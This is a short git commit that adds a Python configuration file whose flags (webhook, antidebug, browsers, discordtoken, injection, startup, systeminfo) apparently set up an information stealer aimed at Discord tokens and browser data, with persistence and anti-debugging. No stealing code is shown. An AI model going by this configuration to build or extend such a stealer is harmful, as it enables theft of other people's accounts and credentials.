f6e27b31c355613475d1d7ebaf058240efefd135
7cclas <clas7c@outtlook.com>
2023-10-27 13:05:33 +0300

    comit

---
+++ src/config.py
@@ -0,0 +1,9 @@
+__CONFIG__ = {
+    'webhook': None,
+    'antidebug': True,
+    'browsers': True,
+    'discordtoken': True,
+    'injection': True,
+    'startup': True,
+    'systeminfo': True,
+}
